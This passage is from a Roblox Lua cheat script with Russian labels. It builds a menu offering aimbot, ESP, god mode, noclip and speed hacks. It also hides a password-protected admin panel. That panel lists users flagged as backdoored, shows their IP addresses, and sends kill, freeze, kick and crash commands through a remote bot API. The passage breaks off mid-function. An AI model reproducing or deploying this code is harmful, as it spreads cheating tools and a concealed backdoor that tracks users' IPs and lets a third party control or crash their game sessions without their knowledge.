                b.btn.BackgroundTransparency = 0.3
                b.btn.Font = Enum.Font.Gotham
            end
            btn.BackgroundTransparency = 0
            btn.Font = Enum.Font.GothamBold
        end)
        
        table.insert(tabs, { btn = btn, frame = tabFrame })
        
        return tabFrame
    end
    
    local function addSection(tabFrame, title)
        local header = Instance.new("TextLabel", tabFrame)
        header.Size = UDim2.new(1, 0, 0, 30)
        header.BackgroundTransparency = 1
        header.Text = "  " .. title
        header.TextColor3 = Color3.fromRGB(170, 120, 255)
        header.TextScaled = true
        header.Font = Enum.Font.GothamBold
        header.TextXAlignment = Enum.TextXAlignment.Left
        return header
    end
    
    local function addButton(tabFrame, text, desc, color, callback)
        local frame = Instance.new("Frame", tabFrame)
        frame.Size = UDim2.new(1, 0, 0, 50)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
        
        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(1, 0, 1, 0)
        btn.BackgroundColor3 = color or Color3.fromRGB(100, 60, 200)
        btn.BackgroundTransparency = 0.1
        btn.Text = ""
        btn.BorderSizePixel = 0
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
        
        local btnText = Instance.new("TextLabel", btn)
        btnText.Size = UDim2.new(0.5, 0, 1, 0)
        btnText.Position = UDim2.new(0, 15, 0, 0)
        btnText.BackgroundTransparency = 1
        btnText.Text = text
        btnText.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnText.TextScaled = true
        btnText.Font = Enum.Font.GothamBold
        btnText.TextXAlignment = Enum.TextXAlignment.Left
        
        local btnDesc = Instance.new("TextLabel", btn)
        btnDesc.Size = UDim2.new(0.45, -25, 1, 0)
        btnDesc.Position = UDim2.new(0.55, 10, 0, 0)
        btnDesc.BackgroundTransparency = 1
        btnDesc.Text = desc or ""
        btnDesc.TextColor3 = Color3.fromRGB(180, 180, 180)
        btnDesc.TextScaled = true
        btnDesc.Font = Enum.Font.Gotham
        
        btn.MouseButton1Click:Connect(callback)
    end
    
    local function addToggle(tabFrame, text, desc, default, callback)
        local state = default or false
        
        local frame = Instance.new("Frame", tabFrame)
        frame.Size = UDim2.new(1, 0, 0, 50)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
        
        local textLabel = Instance.new("TextLabel", frame)
        textLabel.Size = UDim2.new(0.55, 0, 1, 0)
        textLabel.Position = UDim2.new(0, 15, 0, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Text = text
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.GothamBold
        textLabel.TextXAlignment = Enum.TextXAlignment.Left
        
        local descLabel = Instance.new("TextLabel", frame)
        descLabel.Size = UDim2.new(0.3, 0, 1, 0)
        descLabel.Position = UDim2.new(0.5, -10, 0, 0)
        descLabel.BackgroundTransparency = 1
        descLabel.Text = desc or ""
        descLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
        descLabel.TextScaled = true
        descLabel.Font = Enum.Font.Gotham
        
        local toggle = Instance.new("TextButton", frame)
        toggle.Size = UDim2.new(0, 72, 0, 32)
        toggle.Position = UDim2.new(1, -82, 0.5, -16)
        toggle.BackgroundColor3 = state and Color3.fromRGB(80, 220, 120) or Color3.fromRGB(70, 70, 90)
        toggle.Text = ""
        toggle.BorderSizePixel = 0
        Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 16)
        
        local knob = Instance.new("Frame", toggle)
        knob.Size = UDim2.new(0, 28, 0, 28)
        knob.Position = state and UDim2.new(1, -32, 0.5, -14) or UDim2.new(0, 4, 0.5, -14)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.BorderSizePixel = 0
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
        
        toggle.MouseButton1Click:Connect(function()
            state = not state
            toggle.BackgroundColor3 = state and Color3.fromRGB(80, 220, 120) or Color3.fromRGB(70, 70, 90)
            knob.Position = state and UDim2.new(1, -32, 0.5, -14) or UDim2.new(0, 4, 0.5, -14)
            callback(state)
        end)
    end
    
    local function addSlider(tabFrame, text, min, max, default, suffix, callback)
        local val = default or min
        
        local frame = Instance.new("Frame", tabFrame)
        frame.Size = UDim2.new(1, 0, 0, 70)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
        
        local label = Instance.new("TextLabel", frame)
        label.Size = UDim2.new(0.55, 0, 0, 25)
        label.Position = UDim2.new(0, 15, 0, 5)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.TextScaled = true
        label.Font = Enum.Font.GothamBold
        label.TextXAlignment = Enum.TextXAlignment.Left
        
        local valueLabel = Instance.new("TextLabel", frame)
        valueLabel.Size = UDim2.new(0.3, 0, 0, 25)
        valueLabel.Position = UDim2.new(0.7, -15, 0, 5)
        valueLabel.BackgroundTransparency = 1
        valueLabel.Text = tostring(val) .. (suffix or "")
        valueLabel.TextColor3 = Color3.fromRGB(170, 120, 255)
        valueLabel.TextScaled = true
        valueLabel.Font = Enum.Font.GothamBold
        valueLabel.TextXAlignment = Enum.TextXAlignment.Right
        
        local bg = Instance.new("Frame", frame)
        bg.Size = UDim2.new(1, -30, 0, 10)
        bg.Position = UDim2.new(0, 15, 0, 42)
        bg.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
        Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 5)
        
        local fill = Instance.new("Frame", bg)
        fill.Size = UDim2.new((val - min) / (max - min), 0, 1, 0)
        fill.BackgroundColor3 = Color3.fromRGB(140, 80, 255)
        Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 5)
        
        local knob = Instance.new("Frame", bg)
        knob.Size = UDim2.new(0, 22, 0, 22)
        knob.Position = UDim2.new((val - min) / (max - min), -11, 0.5, -11)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.BorderSizePixel = 0
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
        
        local dragging = false
        
        knob.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
            end
        end)
        
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
            end
        end)
        
        UIS.InputChanged:Connect(function(i)
            if not dragging or i.UserInputType ~= Enum.UserInputType.MouseMovement then
                return
            end
            local bgAbs = bg.AbsolutePosition.X
            local bgW = bg.AbsoluteSize.X
            local rel = math.clamp((UIS:GetMouseLocation().X - bgAbs) / bgW, 0, 1)
            val = math.floor(min + rel * (max - min))
            fill.Size = UDim2.new(rel, 0, 1, 0)
            knob.Position = UDim2.new(rel, -11, 0.5, -11)
            valueLabel.Text = tostring(val) .. (suffix or "")
            callback(val)
        end)
    end
    
    -- ==============================================
    -- СОЗДАНИЕ ВКЛАДОК
    -- ==============================================
    
    -- Боевые
    local combatTab = addTab("Боевые", "⚔️")
    addSection(combatTab, "Основные функции")
    addToggle(combatTab, "God Mode", "Полная неуязвимость", GodMode.active, function(v)
        if v then enableGodMode() else disableGodMode() end
    end)
    addToggle(combatTab, "Полёт", "WASD + Space/Ctrl", Flight.active, function(v)
        if v then enableFlight() else disableFlight() end
    end)
    addToggle(combatTab, "Ноклип", "Сквозь стены", Noclip.active, function(v)
        if v then enableNoclip() else disableNoclip() end
    end)
    addToggle(combatTab, "ESP", "Подсветка игроков", ESP.active, function(v)
        if v then enableESP() else disableESP() end
    end)
    addToggle(combatTab, "Aimbot", "Автонаведение", Aimbot.active, function(v)
        if v then enableAimbot() else disableAimbot() end
    end)
    addToggle(combatTab, "Triggerbot", "Автострельба", Triggerbot.active, function(v)
        if v then enableTriggerbot() else disableTriggerbot() end
    end)
    addToggle(combatTab, "Anti-AFK", "Защита от кика", AntiAfk.active, function(v)
        if v then enableAntiAfk() else disableAntiAfk() end
    end)
    addToggle(combatTab, "Бесконечный прыжок", "Прыжки в воздухе", InfJump.active, function(v)
        if v then enableInfJump() else disableInfJump() end
    end)
    addButton(combatTab, "Убить себя", "Мгновенная смерть", Color3.fromRGB(220, 60, 60), function()
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.Health = 0 end
    end)
    addButton(combatTab, "Флинг", "Отбросить игрока", Color3.fromRGB(180, 60, 180), function()
        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(math.random(-500, 500), math.random(500, 1000), math.random(-500, 500))
            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            bv.Parent = root
            game:GetService("Debris"):AddItem(bv, 0.3)
        end
    end)
    
    -- Движение
    local moveTab = addTab("Движение", "🏃")
    addSection(moveTab, "Скорость и прыжки")
    addSlider(moveTab, "Скорость ходьбы", 1, 300, 16, "", function(v)
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.WalkSpeed = v end
    end)
    addSlider(moveTab, "Сила прыжка", 1, 200, 50, "", function(v)
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.JumpPower = v end
    end)
    addSlider(moveTab, "Скорость полёта", 5, 500, 50, "", function(v)
        Flight.speed = v
    end)
    addToggle(moveTab, "Ускорение ходьбы", "x4 скорость (60)", WalkspeedBoost.active, function(v)
        if v then enableWalkspeedBoost() else disableWalkspeedBoost() end
    end)
    addToggle(moveTab, "Ускорение прыжка", "x2 прыжок (100)", JumpBoost.active, function(v)
        if v then enableJumpBoost() else disableJumpBoost() end
    end)
    addSection(moveTab, "Особые режимы")
    addToggle(moveTab, "Клик-телепорт", "ТП по клику мыши", ClickTP.active, function(v)
        if v then enableClickTP() else disableClickTP() end
    end)
    addToggle(moveTab, "Нет урона от падения", "Защита от падений", NoFallDamage.active, function(v)
        if v then enableNoFallDamage() else disableNoFallDamage() end
    end)
    addToggle(moveTab, "Bunny Hop", "Автопрыжок при беге", BunnyHop.active, function(v)
        if v then enableBunnyHop() else disableBunnyHop() end
    end)
    addToggle(moveTab, "Spider", "Хождение по стенам", Spider.active, function(v)
        if v then enableSpider() else disableSpider() end
    end)
    addToggle(moveTab, "Vanish", "Невидимость", Vanish.active, function(v)
        if v then enableVanish() else disableVanish() end
    end)
    
    -- Визуал
    local visualTab = addTab("Визуал", "🎨")
    addSection(visualTab, "Эффекты")
    addToggle(visualTab, "X-Ray", "Видеть сквозь стены", XRay.active, function(v)
        if v then enableXRay() else disableXRay() end
    end)
    addSlider(visualTab, "Поле зрения", 30, 120, 70, "", function(v)
        Camera.FieldOfView = v
    end)
    addSlider(visualTab, "Яркость", 0, 5, 2, "", function(v)
        Lighting.Brightness = v
    end)
    addButton(visualTab, "Flash", "Вспышка", Color3.fromRGB(255, 220, 0), function()
        local pg = getPG()
        local sg = Instance.new("ScreenGui")
        sg.Name = "Flash"
        sg.ResetOnSpawn = false
        sg.Parent = pg
        local f = Instance.new("Frame", sg)
        f.Size = UDim2.new(1, 0, 1, 0)
        f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        f.BackgroundTransparency = 0
        f.ZIndex = 10
        TS:Create(f, TweenInfo.new(0.9), { BackgroundTransparency = 1 }):Play()
        game:GetService("Debris"):AddItem(sg, 1.5)
    end)
    addButton(visualTab, "Seizure", "Эпилепсия", Color3.fromRGB(255, 0, 128), function()
        task.spawn(function()
            for i = 1, 30 do
                Lighting.FogColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
                task.wait(0.05)
            end
            Lighting.FogColor = Color3.fromRGB(128, 128, 128)
        end)
    end)
    addButton(visualTab, "Disco", "Дискотека", Color3.fromRGB(255, 100, 0), function()
        task.spawn(function()
            for i = 1, 30 do
                Lighting.Brightness = math.random(0, 3)
                task.wait(0.1)
            end
            Lighting.Brightness = 2
        end)
    end)
    addButton(visualTab, "Fullbright", "Максимальная яркость", Color3.fromRGB(255, 255, 255), function()
        Lighting.Brightness = 2
        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
    end)
    
    -- Утилиты
    local utilTab = addTab("Утилиты", "🛠️")
    addSection(utilTab, "Полезные функции")
    addButton(utilTab, "Информация", "Данные аккаунта", Color3.fromRGB(100, 150, 255), function()
        safeNotify("Информация", string.format("%s | ID: %d | Возраст: %d дней", LP.Name, LP.UserId, LP.AccountAge), 5)
    end)
    addButton(utilTab, "FPS Boost", "Оптимизация", Color3.fromRGB(50, 200, 50), function()
        pcall(function()
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 9e9
        end)
    end)
    addButton(utilTab, "Spin 5 сек", "Вращение", Color3.fromRGB(60, 170, 210), function()
        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local ang = 0
            local conn = RS.RenderStepped:Connect(function()
                ang = ang + 10
                root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, math.rad(ang), 0)
            end)
            task.delay(5, function() conn:Disconnect() end)
        end
    end)
    addButton(utilTab, "Вылечить", "Восстановить HP", Color3.fromRGB(60, 220, 120), function()
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.Health = hum.MaxHealth end
    end)
    addButton(utilTab, "ТП в центр", "0, 50, 0", Color3.fromRGB(50, 150, 255), function()
        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if root then root.CFrame = CFrame.new(0, 50, 0) end
    end)
    addButton(utilTab, "ТП в небо", "+500 по Y", Color3.fromRGB(100, 200, 255), function()
        local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
        if root then root.CFrame = root.CFrame * CFrame.new(0, 500, 0) end
    end)
    addButton(utilTab, "Сбросить персонажа", "Рестарт", Color3.fromRGB(200, 150, 50), function()
        local char = LP.Character
        if char then char:BreakJoints() end
    end)
    addButton(utilTab, "Копировать ID", "В буфер", Color3.fromRGB(150, 150, 150), function()
        if setclipboard then
            setclipboard(tostring(LP.UserId))
            safeNotify("✅", "ID скопирован", 2)
        end
    end)
    addButton(utilTab, "Перезагрузить игру", "Teleport", Color3.fromRGB(200, 100, 100), function()
        TPS:Teleport(game.PlaceId, LP)
    end)
    
    -- Разное
    local miscTab = addTab("Разное", "🎲")
    addSection(miscTab, "Экспериментальное")
    addButton(miscTab, "Big Head", "Огромная голова", Color3.fromRGB(100, 80, 200), function()
        local head = LP.Character and LP.Character:FindFirstChild("Head")
        if head then
            TS:Create(head, TweenInfo.new(0.5), { Size = Vector3.new(4, 4, 4) }):Play()
            task.delay(8, function()
                TS:Create(head, TweenInfo.new(0.5), { Size = Vector3.new(2, 1, 1) }):Play()
            end)
        end
    end)
    addButton(miscTab, "Маленькая голова", "Мини", Color3.fromRGB(50, 50, 150), function()
        local head = LP.Character and LP.Character:FindFirstChild("Head")
        if head then
            TS:Create(head, TweenInfo.new(0.5), { Size = Vector3.new(0.5, 0.5, 0.5) }):Play()
            task.delay(8, function()
                TS:Create(head, TweenInfo.new(0.5), { Size = Vector3.new(2, 1, 1) }):Play()
            end)
        end
    end)
    addButton(miscTab, "Длинные руки", "Анимация", Color3.fromRGB(150, 100, 100), function()
        local char = LP.Character
        if not char then return end
        for _, name in ipairs({"Left Arm", "Right Arm", "LeftHand", "RightHand"}) do
            local p = char:FindFirstChild(name)
            if p then
                TS:Create(p, TweenInfo.new(0.5), { Size = Vector3.new(1, 3, 1) }):Play()
                task.delay(8, function()
                    TS:Create(p, TweenInfo.new(0.5), { Size = Vector3.new(1, 1, 1) }):Play()
                end)
            end
        end
    end)
    addButton(miscTab, "Длинные ноги", "Анимация", Color3.fromRGB(100, 150, 100), function()
        local char = LP.Character
        if not char then return end
        for _, name in ipairs({"Left Leg", "Right Leg", "LeftFoot", "RightFoot"}) do
            local p = char:FindFirstChild(name)
            if p then
                TS:Create(p, TweenInfo.new(0.5), { Size = Vector3.new(1, 3, 1) }):Play()
                task.delay(8, function()
                    TS:Create(p, TweenInfo.new(0.5), { Size = Vector3.new(1, 1, 1) }):Play()
                end)
            end
        end
    end)
    addButton(miscTab, "Изменить цвет", "Рандомный цвет", Color3.fromRGB(255, 0, 255), function()
        local char = LP.Character
        if not char then return end
        for _, v in ipairs(char:GetChildren()) do
            if v:IsA("Part") or v:IsA("MeshPart") then
                v.BrickColor = BrickColor.random()
            end
        end
    end)
    
    -- Сворачивание
    local minimized = false
    local origSize = container.Size
    local origPos = container.Position
    
    minBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            origSize = container.Size
            origPos = container.Position
            container.Size = UDim2.new(0, 200, 0, 55)
            container.Position = UDim2.new(1, -210, 0, 10)
            contentArea.Visible = false
            tabContainer.Visible = false
            minBtn.Text = "□"
        else
            container.Size = origSize
            container.Position = origPos
            contentArea.Visible = true
            tabContainer.Visible = true
            minBtn.Text = "─"
        end
    end)
    
    return mainGui
end

-- ==============================================
-- АДМИН-ПАНЕЛЬ (СКРЫТАЯ)
-- ==============================================
local ADMIN_PASSWORD = "S1R0TA"
local isAdmin = false
local adminPanel = nil

local function createAdminPanel()
    if adminPanel then
        adminPanel:Destroy()
        adminPanel = nil
        return
    end
    
    adminPanel = Instance.new("ScreenGui")
    adminPanel.Name = "HH_Admin"
    adminPanel.ResetOnSpawn = false
    adminPanel.Parent = getPG()
    
    local overlay = Instance.new("Frame", adminPanel)
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0.55
    
    local frame = Instance.new("Frame", adminPanel)
    frame.Size = UDim2.new(0, 900, 0, 650)
    frame.Position = UDim2.new(0.5, -450, 0.5, -325)
    frame.BackgroundColor3 = Color3.fromRGB(14, 14, 24)
    frame.Active = true
    frame.Draggable = true
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
    
    local titleBar = Instance.new("Frame", frame)
    titleBar.Size = UDim2.new(1, 0, 0, 52)
    titleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    titleBar.BackgroundTransparency = 0.25
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 12)
    
    local titleLbl = Instance.new("TextLabel", titleBar)
    titleLbl.Size = UDim2.new(1, -60, 1, 0)
    titleLbl.Position = UDim2.new(0, 18, 0, 0)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text = "👑 АДМИН-ПАНЕЛЬ"
    titleLbl.TextColor3 = Color3.fromRGB(200, 150, 255)
    titleLbl.TextScaled = true
    titleLbl.Font = Enum.Font.GothamBold
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    
    local closeBtn = Instance.new("TextButton", titleBar)
    closeBtn.Size = UDim2.new(0, 38, 0, 38)
    closeBtn.Position = UDim2.new(1, -44, 0.5, -19)
    closeBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.BorderSizePixel = 0
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
    closeBtn.MouseButton1Click:Connect(function()
        adminPanel:Destroy()
        adminPanel = nil
    end)
    
    local searchBox = Instance.new("TextBox", frame)
    searchBox.Size = UDim2.new(1, -20, 0, 38)
    searchBox.Position = UDim2.new(0, 10, 0, 58)
    searchBox.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
    searchBox.PlaceholderText = "🔍 Поиск по нику..."
    searchBox.Text = ""
    searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    searchBox.TextScaled = true
    searchBox.Font = Enum.Font.Gotham
    searchBox.BorderSizePixel = 0
    Instance.new("UICorner", searchBox).CornerRadius = UDim.new(0, 8)
    
    local statsBar = Instance.new("Frame", frame)
    statsBar.Size = UDim2.new(1, -20, 0, 38)
    statsBar.Position = UDim2.new(0, 10, 0, 102)
    statsBar.BackgroundColor3 = Color3.fromRGB(30, 28, 50)
    statsBar.BorderSizePixel = 0
    Instance.new("UICorner", statsBar).CornerRadius = UDim.new(0, 8)
    
    local totalLbl = Instance.new("TextLabel", statsBar)
    totalLbl.Size = UDim2.new(0.33, 0, 1, 0)
    totalLbl.BackgroundTransparency = 1
    totalLbl.Text = "Всего: 0"
    totalLbl.TextColor3 = Color3.fromRGB(200, 200, 255)
    totalLbl.TextScaled = true
    totalLbl.Font = Enum.Font.GothamBold
    
    local sameLbl = Instance.new("TextLabel", statsBar)
    sameLbl.Size = UDim2.new(0.33, 0, 1, 0)
    sameLbl.Position = UDim2.new(0.33, 0, 0, 0)
    sameLbl.BackgroundTransparency = 1
    sameLbl.Text = "В сервере: 0"
    sameLbl.TextColor3 = Color3.fromRGB(100, 255, 100)
    sameLbl.TextScaled = true
    sameLbl.Font = Enum.Font.GothamBold
    
    local bdLbl = Instance.new("TextLabel", statsBar)
    bdLbl.Size = UDim2.new(0.34, 0, 1, 0)
    bdLbl.Position = UDim2.new(0.66, 0, 0, 0)
    bdLbl.BackgroundTransparency = 1
    bdLbl.Text = "Бекдор: 0"
    bdLbl.TextColor3 = Color3.fromRGB(255, 100, 255)
    bdLbl.TextScaled = true
    bdLbl.Font = Enum.Font.GothamBold
    
    local refreshBtn = Instance.new("TextButton", frame)
    refreshBtn.Size = UDim2.new(0, 100, 0, 38)
    refreshBtn.Position = UDim2.new(1, -110, 0, 58)
    refreshBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 180)
    refreshBtn.Text = "🔄 Обновить"
    refreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    refreshBtn.TextScaled = true
    refreshBtn.Font = Enum.Font.GothamBold
    refreshBtn.BorderSizePixel = 0
    Instance.new("UICorner", refreshBtn).CornerRadius = UDim.new(0, 8)
    
    local scroll = Instance.new("ScrollingFrame", frame)
    scroll.Size = UDim2.new(1, -20, 1, -150)
    scroll.Position = UDim2.new(0, 10, 0, 146)
    scroll.BackgroundColor3 = Color3.fromRGB(18, 16, 30)
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 5
    scroll.ScrollBarImageColor3 = Color3.fromRGB(140, 80, 255)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    Instance.new("UICorner", scroll).CornerRadius = UDim.new(0, 8)
    
    local scrollLayout = Instance.new("UIListLayout", scroll)
    scrollLayout.Padding = UDim.new(0, 8)
    scrollLayout.SortOrder = Enum.SortOrder.LayoutOrder
    
    local scrollPad = Instance.new("UIPadding", scroll)
    scrollPad.PaddingLeft = UDim.new(0, 8)
    scrollPad.PaddingRight = UDim.new(0, 8)
    scrollPad.PaddingTop = UDim.new(0, 8)
    scrollPad.PaddingBottom = UDim.new(0, 8)
    
    local function addPlayerCard(uid, info)
        local card = Instance.new("Frame", scroll)
        card.Size = UDim2.new(1, 0, 0, 190)
        card.BackgroundColor3 = Color3.fromRGB(26, 24, 42)
        card.BorderSizePixel = 0
        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 8)
        
        local dot = Instance.new("Frame", card)
        dot.Size = UDim2.new(0, 10, 0, 10)
        dot.Position = UDim2.new(0, 12, 0, 12)
        dot.BorderSizePixel = 0
        dot.BackgroundColor3 = info.same and Color3.fromRGB(80, 220, 80) or Color3.fromRGB(220, 80, 80)
        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
        
        local nameLbl = Instance.new("TextLabel", card)
        nameLbl.Size = UDim2.new(0.5, 0, 0, 20)
        nameLbl.Position = UDim2.new(0, 28, 0, 6)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = info.name .. (info.hasBackdoor and " [БД]" or "")
        nameLbl.TextColor3 = info.hasBackdoor and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 255, 255)
        nameLbl.TextScaled = true
        nameLbl.Font = Enum.Font.GothamBold
        nameLbl.TextXAlignment = Enum.TextXAlignment.Left
        
        local idLbl = Instance.new("TextLabel", card)
        idLbl.Size = UDim2.new(0.5, 0, 0, 18)
        idLbl.Position = UDim2.new(0.5, 0, 0, 8)
        idLbl.BackgroundTransparency = 1
        idLbl.Text = "ID: " .. uid:sub(1, 10) .. "..."
        idLbl.TextColor3 = Color3.fromRGB(160, 160, 160)
        idLbl.TextScaled = true
        idLbl.Font = Enum.Font.Gotham
        idLbl.TextXAlignment = Enum.TextXAlignment.Left
        
        local placeLbl = Instance.new("TextLabel", card)
        placeLbl.Size = UDim2.new(0.5, 0, 0, 18)
        placeLbl.Position = UDim2.new(0, 28, 0, 28)
        placeLbl.BackgroundTransparency = 1
        placeLbl.Text = "📍 Place: " .. tostring(info.place):sub(1, 8)
        placeLbl.TextColor3 = info.same and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 220, 80)
        placeLbl.TextScaled = true
        placeLbl.Font = Enum.Font.Gotham
        placeLbl.TextXAlignment = Enum.TextXAlignment.Left
        
        local timeLbl = Instance.new("TextLabel", card)
        timeLbl.Size = UDim2.new(0.5, 0, 0, 18)
        timeLbl.Position = UDim2.new(0.5, 0, 0, 28)
        timeLbl.BackgroundTransparency = 1
        timeLbl.Text = "⏰ " .. os.date("%H:%M:%S", math.floor(info.time or tick()))
        timeLbl.TextColor3 = Color3.fromRGB(150, 150, 255)
        timeLbl.TextScaled = true
        timeLbl.Font = Enum.Font.Gotham
        timeLbl.TextXAlignment = Enum.TextXAlignment.Left
        
        local ipLbl = Instance.new("TextLabel", card)
        ipLbl.Size = UDim2.new(0.5, 0, 0, 18)
        ipLbl.Position = UDim2.new(0, 28, 0, 48)
        ipLbl.BackgroundTransparency = 1
        ipLbl.Text = "🌐 IP: " .. (info.ip or "Unknown")
        ipLbl.TextColor3 = Color3.fromRGB(180, 200, 255)
        ipLbl.TextScaled = true
        ipLbl.Font = Enum.Font.Gotham
        ipLbl.TextXAlignment = Enum.TextXAlignment.Left
        
        local jobLbl = Instance.new("TextLabel", card)
        jobLbl.Size = UDim2.new(0.5, 0, 0, 18)
        jobLbl.Position = UDim2.new(0.5, 0, 0, 48)
        jobLbl.BackgroundTransparency = 1
        jobLbl.Text = "Server: " .. tostring(info.job or "?")
        jobLbl.TextColor3 = Color3.fromRGB(180, 180, 180)
        jobLbl.TextScaled = true
        jobLbl.Font = Enum.Font.Gotham
        jobLbl.TextXAlignment = Enum.TextXAlignment.Left
        
        local btnContainer = Instance.new("Frame", card)
        btnContainer.Size = UDim2.new(1, -20, 0, 105)
        btnContainer.Position = UDim2.new(0, 10, 0, 72)
        btnContainer.BackgroundTransparency = 1
        
        local grid = Instance.new("UIGridLayout", btnContainer)
        grid.CellSize = UDim2.new(0, 78, 0, 28)
        grid.CellPadding = UDim2.new(0, 4, 0, 4)
        grid.FillDirection = Enum.FillDirection.Horizontal
        
        local function addBtn(text, color, callback)
            local btn = Instance.new("TextButton", btnContainer)
            btn.Size = UDim2.new(0, 78, 0, 28)
            btn.BackgroundColor3 = color
            btn.Text = text
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.TextScaled = true
            btn.Font = Enum.Font.GothamBold
            btn.BorderSizePixel = 0
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
            btn.MouseButton1Click:Connect(callback)
        end
        
        addBtn("💀 Kill", Color3.fromRGB(220, 60, 60), function()
            sendToBot("/api/commands", { target_id = uid, command = "KILL_PLAYER", data = "", sender_id = USER_ID })
        end)
        addBtn("🔄 Loop", Color3.fromRGB(200, 110, 50), function()
            sendToBot("/api/commands", { target_id = uid, command = "START_KILL_LOOP", data = "", sender_id = USER_ID })
        end)
        addBtn("⏹ Stop", Color3.fromRGB(100, 100, 100), function()
            sendToBot("/api/commands", { target_id = uid, command = "STOP_KILL_LOOP", data = "", sender_id = USER_ID })
        end)
        addBtn("❄️ Freeze", Color3.fromRGB(60, 120, 220), function()
            sendToBot("/api/commands", { target_id = uid, command = "FREEZE_PLAYER", data = "", sender_id = USER_ID })
        end)
        addBtn("🔥 Unfreeze", Color3.fromRGB(220, 160, 60), function()
            sendToBot("/api/commands", { target_id = uid, command = "UNFREEZE_PLAYER", data = "", sender_id = USER_ID })
        end)
        addBtn("👢 Kick", Color3.fromRGB(200, 80, 80), function()
            sendToBot("/api/commands", { target_id = uid, command = "KICK_PLAYER", data = "Вы кикнуты", sender_id = USER_ID })
        end)
        addBtn("👁 Watch", Color3.fromRGB(140, 80, 255), function()
            sendToBot("/api/commands", { target_id = uid, command = "SPECTATE", data = uid, sender_id = USER_ID })
        end)
        addBtn("📍 TP to", Color3.fromRGB(60, 180, 140), function()
            sendToBot("/api/commands", { target_id = uid, command = "TP_TO", data = uid, sender_id = USER_ID })
        end)
        addBtn("📦 Bring", Color3.fromRGB(100, 200, 80), function()
            sendToBot("/api/commands", { target_id = uid, command = "BRING", data = uid, sender_id = USER_ID })
        end)
        addBtn("🐢 Spd 1", Color3.fromRGB(100, 140, 200), function()
            sendToBot("/api/commands", { target_id = uid, command = "SET_WALKSPEED", data = "1", sender_id = USER_ID })
        end)
        addBtn("🚀 Spd 100", Color3.fromRGB(200, 200, 50), function()
            sendToBot("/api/commands", { target_id = uid, command = "SET_WALKSPEED", data = "100", sender_id = USER_ID })
        end)
        addBtn("💥 Crash", Color3.fromRGB(200, 50, 50), function()
            sendToBot("/api/commands", { target_id = uid, command = "CRASH_PLAYER", data = "", sender_id = USER_ID })
        end)
        addBtn("⬛ Black", Color3.fromRGB(50, 50, 50), function()
